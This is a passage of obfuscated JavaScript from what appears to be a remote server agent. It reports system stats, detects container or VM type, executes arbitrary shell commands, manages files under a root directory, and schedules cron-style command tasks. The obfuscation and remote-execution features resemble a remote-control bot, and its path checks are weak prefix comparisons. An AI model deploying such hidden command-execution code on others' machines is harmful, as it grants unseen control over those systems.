    async [a0T(0xa0)]() {
        const ax = a0T, a = {
                'ZuRbp': function (m, n) {
                    return m / n;
                },
                'IWqsK': function (m, n) {
                    return m / n;
                },
                'SGRDd': function (m, n) {
                    return m * n;
                },
                'DhqZM': function (m, n) {
                    return m / n;
                },
                'DxRvR': function (m, n) {
                    return m * n;
                },
                'QbgVh': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise['all']([
                a0n[ax(0x354)](),
                a0n[ax(0xba)](),
                a0n['networkStats'](),
                a0n['currentLoad']()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[ax(0x229)](Date[ax(0x1b5)](), 0x3e8), i = h - this[ax(0xfa)], j = g[ax(0x333)] - this[ax(0x258)]['tx'], k = g[ax(0xf9)] - this[ax(0x258)]['rx'];
        this[ax(0x246)] += j, this[ax(0x28f)] += k, this['lastNetworkStats'] = {
            'tx': g[ax(0x333)],
            'rx': g[ax(0xf9)]
        }, this[ax(0xfa)] = h;
        const l = await a0n['processes']();
        return {
            'cpu': { 'usage': Math[ax(0x80)](b[ax(0x354)]) },
            'ram': {
                'total': c[ax(0x163)],
                'used': c['active']
            },
            'swap': {
                'total': c[ax(0x38f)],
                'used': c[ax(0xe8)]
            },
            'load': {
                'load1': a[ax(0x148)](Math[ax(0x80)](f['avgLoad'] * 0x64), 0x64),
                'load5': a[ax(0x148)](Math['round'](a[ax(0xf7)](f['avgLoad'], 0x64)), 0x64),
                'load15': a['DhqZM'](Math[ax(0x80)](a[ax(0x370)](f[ax(0x117)], 0x64)), 0x64)
            },
            'disk': await this[ax(0x200)](),
            'network': {
                'up': Math[ax(0x80)](j / i),
                'down': Math[ax(0x80)](a['QbgVh'](k, i)),
                'totalUp': this[ax(0x246)],
                'totalDown': this[ax(0x28f)]
            },
            'connections': await this['_getConnections'](),
            'uptime': a0k[ax(0x353)](),
            'process': l?.[ax(0x1b8)] || 0x0,
            'message': ''
        };
    }
    async [a0T(0x278)]() {
        const ay = a0T, a = {
                'AmHXh': ay(0x389),
                'miTpa': '/proc/1/cgroup',
                'yguhn': ay(0x153),
                'DhDxa': ay(0xf5),
                'XdblL': ay(0x1ec),
                'DVLiS': ay(0x1c4),
                'xoVxc': ay(0x2f9),
                'SeXao': ay(0x2c7),
                'fZlXT': 'Docker',
                'LfIUO': ay(0x37a),
                'tUgiI': ay(0x255),
                'ldxPX': ay(0x299),
                'xVVLj': ay(0x277),
                'bNQHG': ay(0x350),
                'oyopE': ay(0x11c)
            };
        try {
            if (a0h['existsSync'](ay(0x2e9)))
                return ay(0x22b);
            if (a0h[ay(0x2d2)](ay(0x101)))
                return a[ay(0x2fc)];
            if (a0h[ay(0x2d2)](a[ay(0x265)])) {
                const b = a0h['readFileSync'](a[ay(0x265)], a[ay(0x188)])[ay(0x139)]();
                if (b[ay(0x237)](a['DhDxa']) || b[ay(0x237)](ay(0x174)))
                    return ay(0x22b);
                else {
                    if (b[ay(0x237)]('kubepods'))
                        return a[ay(0x225)];
                    else {
                        if (b['includes'](a[ay(0x74)]))
                            return a[ay(0xf4)];
                    }
                }
            }
            if (a0h[ay(0x2d2)](a[ay(0xc9)])) {
                const c = a0h[ay(0x2dc)](a[ay(0xc9)], a[ay(0x188)]);
                if (c[ay(0x237)]('/docker/containers/') || c[ay(0x237)](ay(0x2a0)))
                    return a[ay(0x302)];
                else {
                    if (c[ay(0x237)](ay(0x2a6)) || c['includes'](a[ay(0xb9)]))
                        return ay(0x1ec);
                }
            }
            if (a0h[ay(0x2d2)](a['tUgiI'])) {
                const d = a0h[ay(0x2dc)](ay(0x255), a[ay(0x188)]);
                if (d[ay(0x237)](ay(0x1ff)))
                    return 'LXC';
            }
            if (a0h['existsSync'](a[ay(0x1a7)])) {
                const f = a0h[ay(0x2dc)](ay(0x299), a[ay(0x188)]);
                if (f[ay(0x237)]('QEMU') || f[ay(0x237)](a[ay(0x396)]))
                    return a[ay(0x89)];
            }
        } catch (g) {
        }
        return a[ay(0x309)];
    }
    async [a0T(0x200)]() {
        const az = a0T, a = {
                'wdZHG': function (b, c) {
                    return b !== c;
                },
                'MGZpe': az(0x2f6),
                'VnAru': function (b, c) {
                    return b !== c;
                },
                'utvFD': az(0x1e6)
            };
        try {
            const b = await a0n[az(0x16d)](), c = b[az(0xa9)](g => {
                    const aA = az;
                    return g['size'] > 0x0 && a[aA(0x245)](g[aA(0x391)], a[aA(0x94)]) && a[aA(0x290)](g[aA(0x391)], a[aA(0x1b9)]) && g['fs'][aA(0x2f5)](aA(0x2f7));
                }), d = c[az(0x23d)]((g, h) => g + h[az(0x9b)], 0x0), f = c['reduce']((g, h) => g + h[az(0x176)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async ['_getConnections']() {
        const aB = a0T;
        try {
            const a = await a0n[aB(0x28a)](), b = a[aB(0xa9)](d => d['protocol'] === aB(0x1c9))['length'], c = a['filter'](d => d[aB(0x2bb)] === aB(0x1ba))[aB(0x161)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0I {
    static async [a0T(0xed)](a, b = {}) {
        const aC = a0T, c = {
                'MohQl': function (d, f) {
                    return d - f;
                },
                'knXsR': function (d, f) {
                    return d || f;
                },
                'YvbjQ': function (d, f) {
                    return d === f;
                },
                'UhAsk': 'number',
                'CMzgx': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'fTtUi': function (d, f) {
                    return d * f;
                },
                'XvMci': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[aC(0x2ef)](),
                env: env = {},
                timeout: timeout = a0E[aC(0x220)]
            } = b;
        return new Promise(d => {
            const aF = aC, f = {
                    'XIXqJ': function (i, j) {
                        const aD = a0b;
                        return c[aD(0x159)](i, j);
                    },
                    'guRdV': function (i, j) {
                        return c['knXsR'](i, j);
                    },
                    'AGZiw': function (i, j) {
                        const aE = a0b;
                        return c[aE(0x2ea)](i, j);
                    },
                    'jsmlL': c[aF(0x281)]
                }, g = Date[aF(0x1b5)](), h = c[aF(0x1eb)](a0l, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['fTtUi'](timeout, 0x3e8),
                    'maxBuffer': c[aF(0x37d)](0xa * 0x400, 0x400)
                }, (i, j, k) => {
                    const aG = aF, l = f['XIXqJ'](Date[aG(0x1b5)](), g), m = i && i[aG(0xe0)] && i[aG(0x1ae)];
                    let n = f[aG(0x337)](j, '');
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f[aG(0x113)](typeof i['code'], f[aG(0xc7)]) ? o = i[aG(0x306)] : o = -0x1;
                    }
                    d({
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
class a0J {
    static async [a0T(0x269)](a, b = ![]) {
        const aH = a0T, c = {
                'KyrqN': 'directory',
                'njmNT': aH(0x2c8),
                'fWGnC': function (h, i) {
                    return h & i;
                },
                'rPXdY': function (h, i) {
                    return h(i);
                },
                'PFlox': function (h, i) {
                    return h || i;
                },
                'qnRaY': aH(0xce),
                'FyyMa': function (h, i) {
                    return h(i);
                }
            }, d = a0j['resolve'](a0E['FILE_ROOT'], c[aH(0x249)](a, '.'));
        if (!d['startsWith'](a0E[aH(0x1e9)]))
            throw new Error(aH(0x9c));
        if (!a0h[aH(0x2d2)](d))
            throw new Error(c[aH(0x9e)]);
        const f = [], g = h => {
                const aI = aH, i = a0h[aI(0x19c)](h);
                for (const j of i) {
                    const k = a0j[aI(0x2b6)](h, j), l = a0h[aI(0xc3)](k), m = new a0A();
                    m[aI(0x1cc)] = j, m[aI(0x98)] = a0j[aI(0x108)](a0E[aI(0x1e9)], k), m['type'] = l[aI(0x2a1)]() ? c[aI(0x23f)] : c[aI(0x368)], m[aI(0x9b)] = l[aI(0x9b)], m[aI(0x248)] = l['mtime'][aI(0x2bf)](), m['mode'] = this['_formatMode'](l[aI(0x33d)], l['isDirectory']()), m['mode_octal'] = '0o' + c['fWGnC'](l[aI(0x33d)], 0x1ff)['toString'](0x8), m[aI(0x2ae)] = l[aI(0xe9)] + ':' + l[aI(0x338)], f['push'](m), b && l[aI(0x2a1)]() && c[aI(0x213)](g, k);
                }
            };
        return c['FyyMa'](g, d), f;
    }
    static async [a0T(0x375)](a) {
        const aJ = a0T, b = { 'WZEIW': aJ(0x2c8) }, c = [];
        for (const d of a) {
            const f = a0j['resolve'](a0E['FILE_ROOT'], d);
            if (!f[aJ(0x2f5)](a0E[aJ(0x1e9)]))
                continue;
            try {
                const g = a0h[aJ(0xc3)](f), h = this[aJ(0x120)](f, a0h[aJ(0x23c)][aJ(0x25f)]), i = this['_checkAccess'](f, a0h[aJ(0x23c)][aJ(0x2c6)]), j = this[aJ(0x120)](f, a0h['constants'][aJ(0x283)]), k = new a0B();
                k[aJ(0x98)] = a0j['relative'](a0E[aJ(0x1e9)], f), k[aJ(0x1cc)] = a0j[aJ(0xbd)](f), k[aJ(0x33d)] = this['_formatMode'](g['mode'], g[aJ(0x2a1)]()), k[aJ(0x194)] = '0o' + (g[aJ(0x33d)] & 0x1ff)['toString'](0x8), k[aJ(0x391)] = g[aJ(0x2a1)]() ? aJ(0x260) : b[aJ(0x365)], k['readable'] = h, k[aJ(0x8c)] = i, k[aJ(0x2c9)] = j, c[aJ(0x15b)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static ['_checkAccess'](a, b) {
        try {
            return a0h['accessSync'](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0T(0x241)](a) {
        const aK = a0T, b = {
                'tbddz': function (c, d) {
                    return c === d;
                },
                'nAmpW': aK(0x36e),
                'EbPRW': aK(0x2b5),
                'vlsZQ': function (c, d, f) {
                    return c(d, f);
                },
                'fYfZA': aK(0x1ef)
            };
        if (b[aK(0x25e)](typeof a, b[aK(0x112)]))
            return a;
        if (b[aK(0x25e)](typeof a, b[aK(0x1a5)])) {
            const c = a[aK(0x143)]();
            if (/^[0-7]{3,4}$/[aK(0xbe)](c))
                return b['vlsZQ'](parseInt, c, 0x8);
        }
        throw new Error(b['fYfZA']);
    }
    static ['_formatMode'](a, b) {
        const aL = a0T, c = {
                'HGLNw': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)[aL(0x195)](0x8)[aL(0x317)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[aL(0xcb)](parseInt, i, 0xa);
            h += f[aL(0x343)]((k, l) => j & 0x4 >> l ? k : '-')[aL(0x2b6)]('');
        }
        return h;
    }
    static async [a0T(0x133)](a, b = ![]) {
        const aM = a0T, c = {
                'ecIPp': function (g, h) {
                    return g(h);
                },
                'ojJxA': function (g, h) {
                    return g(h);
                },
                'vrAUS': function (g, h) {
                    return g(h);
                },
                'xTtmy': function (g, h) {
                    return g(h);
                },
                'jtehC': 'error'
            }, d = [];
        for (const [g, h] of Object[aM(0x301)](a)) {
            const i = a0j[aM(0x110)](a0E[aM(0x1e9)], g);
            if (!i[aM(0x2f5)](a0E[aM(0x1e9)])) {
                d['push']({
                    'path': g,
                    'requested': c[aM(0x2c5)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': aM(0x393)
                });
                continue;
            }
            try {
                const j = this[aM(0x241)](h), k = m => {
                        a0h['chmodSync'](m, j);
                    };
                if (b && a0h[aM(0x2d2)](i) && a0h[aM(0xc3)](i)[aM(0x2a1)]()) {
                    const m = n => {
                        const aN = aM;
                        c[aN(0x2c5)](k, n);
                        const o = a0h[aN(0x19c)](n);
                        for (const p of o) {
                            const q = a0j['join'](n, p);
                            a0h['statSync'](q)[aN(0x2a1)]() ? m(q) : c['ojJxA'](k, q);
                        }
                    };
                    c[aM(0xd1)](m, i);
                } else
                    c['ojJxA'](k, i);
                const l = j[aM(0x195)](0x8);
                d[aM(0x15b)]({
                    'path': g,
                    'requested': c['xTtmy'](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d['push']({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['jtehC'],
                    'message': n['message']
                });
            }
        }
        const f = d[aM(0xa9)](o => o['status'] === 'ok')['length'];
        return {
            'status': 'ok',
            'total': d[aM(0x161)],
            'success': f,
            'results': d
        };
    }
    static async [a0T(0x324)](a) {
        const aO = a0T, b = {
                'CIHIz': aO(0x9c),
                'MWJYT': function (h, i) {
                    return h > i;
                },
                'JeoMY': function (h, i) {
                    return h * i;
                },
                'IpIMa': aO(0x1d0),
                'qbmeu': aO(0x153),
                'eKZpE': aO(0x1dd),
                'SSrEi': aO(0x374)
            }, c = a0j[aO(0x110)](a0E['FILE_ROOT'], a);
        if (!c[aO(0x2f5)](a0E[aO(0x1e9)]))
            throw new Error(b[aO(0xbf)]);
        const d = a0h[aO(0xc3)](c);
        if (b[aO(0xfc)](d[aO(0x9b)], b[aO(0x99)](0x400, 0x400)))
            throw new Error(b[aO(0x85)]);
        const f = a0h[aO(0x2dc)](c), g = this[aO(0xfd)](f);
        return {
            'status': 'ok',
            'path': a0j[aO(0x108)](a0E[aO(0x1e9)], c),
            'content': g ? a0p[aO(0x6d)](f) : f[aO(0x195)](b[aO(0x75)]),
            'encoding': g ? b[aO(0x33e)] : b['SSrEi'],
            'is_binary': g,
            'size': d[aO(0x9b)]
        };
    }
    static [a0T(0xfd)](a) {
        const aP = a0T, b = {
                'PSUuc': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[aP(0x2b2)](a['length'], 0x0))
            return ![];
        for (let c = 0x0; c < Math['min'](a[aP(0x161)], 0x200); c++) {
            if (a[c] === 0x0)
                return !![];
        }
        return ![];
    }
    static async ['uploadFile'](a, b, c, d = null, f = null) {
        const aQ = a0T, g = {
                'oUIBC': aQ(0x9c),
                'tVbci': 'File\x20too\x20large',
                'hlrpl': function (l, m) {
                    return l !== m;
                },
                'jnhPc': function (l, m) {
                    return l !== m;
                },
                'QZQyq': function (l, m) {
                    return l(m);
                },
                'YhyOz': aQ(0x196),
                'aUYrp': aQ(0x263),
                'WScUi': function (l, m) {
                    return l === m;
                },
                'afoqt': function (l, m) {
                    return l < m;
                }
            }, h = a0j[aQ(0x110)](a0E['FILE_ROOT'], a);
        let j = h;
        b && (j = a0j[aQ(0x2b6)](h, b));
        if (!j[aQ(0x2f5)](a0E[aQ(0x1e9)]))
            throw new Error(g[aQ(0x187)]);
        !a0h[aQ(0x2d2)](a0j[aQ(0x253)](j)) && a0h[aQ(0x1a9)](a0j[aQ(0x253)](j), { 'recursive': !![] });
        const k = a0p[aQ(0x20e)](c);
        if (k[aQ(0x161)] > a0E[aQ(0x1ac)])
            throw new Error(g['tVbci']);
        if (g[aQ(0xaa)](d, null) && g[aQ(0x336)](f, null)) {
            const l = Number(d), m = g[aQ(0x10e)](Number, f);
            if (Number[aQ(0x12f)](l) || Number[aQ(0x12f)](m))
                throw new Error(g[aQ(0x10b)]);
            const n = a0j['join'](a0j['dirname'](j), g[aQ(0x2a5)], a0j['basename'](j));
            !a0h['existsSync'](n) && a0h[aQ(0x1a9)](n, { 'recursive': !![] });
            const o = a0j['join'](n, 'chunk_' + l);
            a0h['writeFileSync'](o, k);
            const p = a0h[aQ(0x19c)](n)['filter'](s => s['startsWith'](aQ(0x151))), q = p['length'], r = g[aQ(0x2de)](q, m);
            if (r) {
                const s = a0h[aQ(0x130)](j);
                for (let t = 0x0; g[aQ(0xea)](t, m); t++) {
                    const u = a0j[aQ(0x2b6)](n, aQ(0x151) + t);
                    if (!a0h['existsSync'](u)) {
                        s[aQ(0x2e1)]();
                        throw new Error('Missing\x20chunk\x20' + t);
                    }
                    s[aQ(0x1c7)](a0h[aQ(0x2dc)](u));
                }
                s[aQ(0x311)]();
                for (const v of a0h[aQ(0x19c)](n)) {
                    a0h[aQ(0x19e)](a0j['join'](n, v));
                }
                a0h[aQ(0x318)](n, {
                    'recursive': !![],
                    'force': !![]
                });
            }
            return {
                'status': 'ok',
                'path': a0j[aQ(0x108)](a0E[aQ(0x1e9)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0h[aQ(0x390)](j, k), {
            'status': 'ok',
            'path': a0j['relative'](a0E[aQ(0x1e9)], j),
            'received': k[aQ(0x161)],
            'total': k['length'],
            'chunked': ![]
        };
    }
    static async [a0T(0x222)](a, b, c, d = null, f = null) {
        const aR = a0T, g = {
                'ePSSu': function (k, l) {
                    return k || l;
                },
                'sEajJ': function (k, l) {
                    return k > l;
                },
                'ClIGa': aR(0x1d0),
                'AHPNx': function (k, l) {
                    return k !== l;
                },
                'mMeog': function (k, l) {
                    return k(l);
                },
                'PIFOl': aR(0x196),
                'DkFOL': function (k, l) {
                    return k === l;
                },
                'qByLa': function (k, l) {
                    return k < l;
                },
                'YrQCA': aR(0x26c),
                'gZykf': aR(0x297)
            }, h = a0j[aR(0x110)](a0E[aR(0x1e9)], g[aR(0x1b3)](a, '.'));
        let j = h;
        b && (j = a0j[aR(0x2b6)](h, b));
        if (!j[aR(0x2f5)](a0E[aR(0x1e9)]))
            throw new Error(aR(0x9c));
        !a0h[aR(0x2d2)](a0j['dirname'](j)) && a0h['mkdirSync'](a0j['dirname'](j), { 'recursive': !![] });
        if (g[aR(0x397)](c[aR(0x161)], a0E[aR(0x1ac)]))
            throw new Error(g['ClIGa']);
        if (d !== null && g['AHPNx'](f, null)) {
            const k = g[aR(0x221)](Number, d), l = g['mMeog'](Number, f);
            if (Number[aR(0x12f)](k) || Number[aR(0x12f)](l))
                throw new Error(g[aR(0x1c6)]);
            const m = a0j[aR(0x2b6)](a0j['dirname'](j), aR(0x263), a0j['basename'](j));
            !a0h['existsSync'](m) && a0h[aR(0x1a9)](m, { 'recursive': !![] });
            const n = a0j[aR(0x2b6)](m, aR(0x151) + k);
            a0h[aR(0x390)](n, c);
            const o = a0h['readdirSync'](m)[aR(0xa9)](r => r[aR(0x2f5)](aR(0x151))), p = o[aR(0x161)], q = g[aR(0x2ab)](p, l);
            if (q) {
                const r = [];
                for (let s = 0x0; g[aR(0x171)](s, l); s++) {
                    const t = a0j[aR(0x2b6)](m, aR(0x151) + s);
                    if (!a0h[aR(0x2d2)](t))
                        throw new Error('Missing\x20chunk\x20' + s);
                    r[aR(0x15b)](a0h['readFileSync'](t));
                }
                a0h[aR(0x390)](j, Buffer[aR(0x16a)](r));
                for (const u of a0h['readdirSync'](m)) {
                    a0h['unlinkSync'](a0j[aR(0x2b6)](m, u));
                }
                return a0h[aR(0x318)](m, {
                    'recursive': !![],
                    'force': !![]
                }), {
                    'status': 'ok',
                    'path': a0j[aR(0x108)](a0E['FILE_ROOT'], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[aR(0x11b)]
                };
            }
            return {
                'status': 'ok',
                'path': a0j[aR(0x108)](a0E[aR(0x1e9)], j),
                'chunk_id': k,
                'completed': ![],
                'message': aR(0x14b) + k + '\x20uploaded.\x20Waiting\x20for\x20remaining\x20blocks.'
            };
        }
        return a0h[aR(0x390)](j, c), {
            'status': 'ok',
            'path': a0j['relative'](a0E[aR(0x1e9)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[aR(0x158)]
        };
    }
    static async [a0T(0x34e)](a) {
        const aS = a0T, b = a0j[aS(0x110)](a0E[aS(0x1e9)], a);
        if (!b[aS(0x2f5)](a0E['FILE_ROOT']))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        if (!a0h[aS(0x2d2)](b))
            throw new Error(aS(0x127));
        const c = a0h['statSync'](b), d = a0h[aS(0x2dc)](b), f = a0p[aS(0x6d)](d);
        return {
            'path': a0j[aS(0x108)](a0E[aS(0x1e9)], b),
            'content': f,
            'size': c[aS(0x9b)]
        };
    }
    static async [a0T(0x2aa)](a) {
        const aT = a0T, b = {
                'ajyaj': aT(0x393),
                'HTdyl': aT(0x2d6),
                'KmVdv': aT(0x360),
                'BjGfc': aT(0x15e)
            }, c = [];
        for (const d of a) {
            const f = a0j[aT(0x110)](a0E[aT(0x1e9)], d);
            if (!f['startsWith'](a0E['FILE_ROOT'])) {
                c['push']({
                    'path': d,
                    'status': b[aT(0x386)]
                });
                continue;
            }
            try {
                if (a0h[aT(0x2d2)](f)) {
                    const g = a0h['statSync'](f);
                    g['isDirectory']() ? a0h[aT(0x318)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0h['unlinkSync'](f), c['push']({
                        'path': d,
                        'status': b['HTdyl']
                    });
                } else
                    c[aT(0x15b)]({
                        'path': d,
                        'status': b[aT(0x312)]
                    });
            } catch (h) {
                c['push']({
                    'path': d,
                    'status': b[aT(0x36f)],
                    'message': h[aT(0x34f)]
                });
            }
        }
        return c;
    }
    static async [a0T(0x315)](a) {
        const aU = a0T, b = { 'jzGWi': aU(0x15e) }, c = [];
        for (const [d, f] of Object[aU(0x301)](a)) {
            const g = a0j[aU(0x110)](a0E[aU(0x1e9)], d), h = a0j[aU(0x110)](a0E['FILE_ROOT'], f);
            if (!g[aU(0x2f5)](a0E[aU(0x1e9)]) || !h[aU(0x2f5)](a0E[aU(0x1e9)])) {
                c[aU(0x15b)]({
                    'from': d,
                    'to': f,
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                const i = a0j[aU(0x253)](h);
                !a0h['existsSync'](i) && a0h[aU(0x1a9)](i, { 'recursive': !![] }), a0h[aU(0xae)](g, h), c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[aU(0x15b)]({
                    'from': d,
                    'to': f,
                    'status': b[aU(0xee)],
                    'message': j['message']
                });
            }
        }
        return c;
    }
    static async [a0T(0xf8)](a) {
        const aV = a0T, b = {
                'zmCvv': function (d, f, g) {
                    return d(f, g);
                },
                'LZIhP': aV(0x15e)
            }, c = [];
        for (const [d, f] of Object[aV(0x301)](a)) {
            const g = a0j[aV(0x110)](a0E[aV(0x1e9)], d), h = a0j[aV(0x110)](a0E[aV(0x1e9)], f);
            if (!g[aV(0x2f5)](a0E['FILE_ROOT']) || !h[aV(0x2f5)](a0E['FILE_ROOT'])) {
                c[aV(0x15b)]({
                    'from': d,
                    'to': f,
                    'status': aV(0x393)
                });
                continue;
            }
            try {
                if (!a0h[aV(0x2d2)](g)) {
                    c[aV(0x15b)]({
                        'from': d,
                        'to': f,
                        'status': aV(0x360)
                    });
                    continue;
                }
                const i = a0j[aV(0x253)](h);
                !a0h['existsSync'](i) && a0h[aV(0x1a9)](i, { 'recursive': !![] });
                const j = a0h[aV(0xc3)](g);
                if (j['isDirectory']()) {
                    if (a0h[aV(0x264)])
                        a0h[aV(0x264)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const aW = aV;
                            if (a0h[aW(0xc3)](l)[aW(0x2a1)]()) {
                                if (!a0h[aW(0x2d2)](m))
                                    a0h[aW(0x1a9)](m, { 'recursive': !![] });
                                for (const n of a0h['readdirSync'](l)) {
                                    b[aW(0x124)](k, a0j[aW(0x2b6)](l, n), a0j['join'](m, n));
                                }
                            } else
                                a0h[aW(0x1b6)](l, m);
                        };
                        b[aV(0x124)](k, g, h);
                    }
                } else
                    a0h['copyFileSync'](g, h);
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[aV(0x15b)]({
                    'from': d,
                    'to': f,
                    'status': b['LZIhP'],
                    'message': l[aV(0x34f)]
                });
            }
        }
        return c;
    }
    static async [a0T(0xe3)](a) {
        const aX = a0T, b = { 'pfkjo': 'Access\x20denied:\x20path\x20outside\x20root' }, c = a0j[aX(0x110)](a0E[aX(0x1e9)], a);
        if (!c[aX(0x2f5)](a0E[aX(0x1e9)]))
            throw new Error(b[aX(0x27c)]);
        return a0h[aX(0x1a9)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0j[aX(0x108)](a0E['FILE_ROOT'], c)
        };
    }
}
class a0K {
    static [a0T(0x16f)] = new Map();
    static [a0T(0xde)](a, b) {
        const aY = a0T, c = {
                'nnGRV': function (d, f) {
                    return d > f;
                },
                'UMmVw': function (d, f) {
                    return d - f;
                }
            };
        a[aY(0x15b)](b), c[aY(0x369)](a['length'], a0E['MAX_TASK_LOG_SIZE']) && a['splice'](0x0, c['UMmVw'](a[aY(0x161)], a0E[aY(0x109)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const aZ = a0T, g = new Date()[aZ(0x2bf)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + aZ(0x1f2) + a + '\x20----\x20exitcode=' + c + '\x0a' + (b?.[aZ(0x143)]() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const b0 = a0T;
        return {
            'status': 'ok',
            'count': a0E[b0(0x11f)][b0(0x161)],
            'tasks': a0E[b0(0x11f)]
        };
    }
    static async [a0T(0x27d)](a) {
        const b1 = a0T, b = {
                'wOSDH': function (d, f) {
                    return d < f;
                },
                'ylAmr': b1(0x1e1),
                'rVpJP': b1(0x15e)
            };
        a0E[b1(0x11f)] = a || [], a0E[b1(0x1fc)] = !![];
        const c = [];
        for (let d = 0x0; b['wOSDH'](d, a0E[b1(0x11f)][b1(0x161)]); d++) {
            const f = a0E['onetasks'][d], g = await a0I[b1(0xed)](f), h = this['_formatLogEntry'](f, g[b1(0x382)], g[b1(0x2b4)], b[b1(0xb3)]);
            this[b1(0xde)](a0E[b1(0x90)], h), c['push']({
                'index': d,
                'cmd': f,
                'exitcode': g[b1(0x2b4)],
                'output': g[b1(0x382)],
                'status': g[b1(0x2b4)] === 0x0 ? 'ok' : b[b1(0x2b0)]
            });
        }
        return a0E[b1(0x1fc)] = ![], {
            'status': 'ok',
            'count': a0E[b1(0x11f)]['length'],
            'tasks': a0E[b1(0x11f)],
            'executed': c
        };
    }
    static [a0T(0x156)]() {
        const b2 = a0T;
        return {
            'status': 'ok',
            'count': Object['keys'](a0E['crontasks'])[b2(0x161)],
            'tasks': a0E[b2(0x147)]
        };
    }
    static ['setCronTasks'](a) {
        const b3 = a0T, b = {
                'RPUgY': function (d, f) {
                    return d === f;
                },
                'pvFjZ': 'function',
                'OkDzr': b3(0x13e),
                'PqmGF': function (d, f) {
                    return d || f;
                },
                'WptRf': function (d, f) {
                    return d > f;
                },
                'nlGvz': function (d, f) {
                    return d - f;
                }
            };
        this[b3(0x16f)]['forEach'](d => {
            const b4 = b3;
            typeof d[b4(0x145)] === 'function' && d[b4(0x145)](), b[b4(0x2f2)](typeof d[b4(0x21e)], b[b4(0x140)]) && d[b4(0x21e)]();
        }), this['cronJobs']['clear']();
        const c = [];
        for (const d of Object[b3(0xc6)](b[b3(0x157)](a, {}))) {
            !a0m[b3(0xc1)](d) && c[b3(0x15b)](d);
        }
        if (b[b3(0x152)](c['length'], 0x0))
            return {
                'status': b3(0x15e),
                'message': b3(0x13f) + c['join'](',\x20'),
                'valid_count': b[b3(0x376)](Object[b3(0xc6)](a || {})[b3(0x161)], c['length'])
            };
        a0E[b3(0x147)] = a || {};
        for (const [f, g] of Object[b3(0x301)](a0E['crontasks'])) {
            const h = a0m[b3(0x36b)](f, async () => {
                const b5 = b3, i = await a0I[b5(0xed)](g), j = this[b5(0xc0)](g, i[b5(0x382)], i[b5(0x2b4)], b[b5(0x17d)], f);
                this[b5(0xde)](a0E[b5(0x2ee)], j);
            });
            this['cronJobs'][b3(0x293)](f, h);
        }
        return a0E['cronloop'] = b[b3(0x152)](Object['keys'](a0E[b3(0x147)])[b3(0x161)], 0x0), {
            'status': 'ok',
            'count': Object[b3(0xc6)](a0E[b3(0x147)])[b3(0x161)],
            'tasks': a0E[b3(0x147)]
        };
    }
    static [a0T(0x1a6)]() {
        const b6 = a0T;
        return {
            'onetime': {
                'pending': a0E['InitTask'],
                'count': a0E['onetasks'][b6(0x161)]
            },
            'cron': {
                'active': a0E[b6(0x33c)],
                'count': Object[b6(0xc6)](a0E[b6(0x147)])[b6(0x161)],
                'check_interval': a0E[b6(0x316)]
            }
        };
    }
    static [a0T(0x10f)](a = 0x32) {
        const b7 = a0T, b = a0E[b7(0x90)][b7(0x78)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static [a0T(0x314)](a = 0x32) {
        const b8 = a0T, b = a0E[b8(0x2ee)][b8(0x78)](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const b9 = a0T, a = { 'tcAYz': b9(0x1e1) }, b = a0E['onetimetasks_log'][b9(0x161)];
        return a0E[b9(0x90)] = [], {
            'status': 'ok',
            'cleared': a[b9(0x91)]
        };
    }
    static [a0T(0x327)]() {
        const ba = a0T, a = a0E['crontasks_log']['length'];
        return a0E[ba(0x2ee)] = [], {
            'status': 'ok',
            'cleared': ba(0x13e)
        };
    }
    static ['getLogSummary']() {
        const bb = a0T, a = a0E[bb(0x90)][bb(0xa9)](f => f[bb(0x2b4)] === 0x0)[bb(0x161)], b = a0E[bb(0x90)]['length'] - a, c = a0E[bb(0x2ee)][bb(0xa9)](f => f[bb(0x2b4)] === 0x0)['length'], d = a0E['crontasks_log']['length'] - c;
        return {
            'onetime': {
                'total_logged': a0E[bb(0x90)][bb(0x161)],
                'max_capacity': a0E[bb(0x109)],
                'recent_success': a,
                'recent_failed': b
            },
            'cron': {
                'total_logged': a0E[bb(0x2ee)]['length'],
                'max_capacity': a0E[bb(0x109)],
                'recent_success': c,
                'recent_failed': d
            }
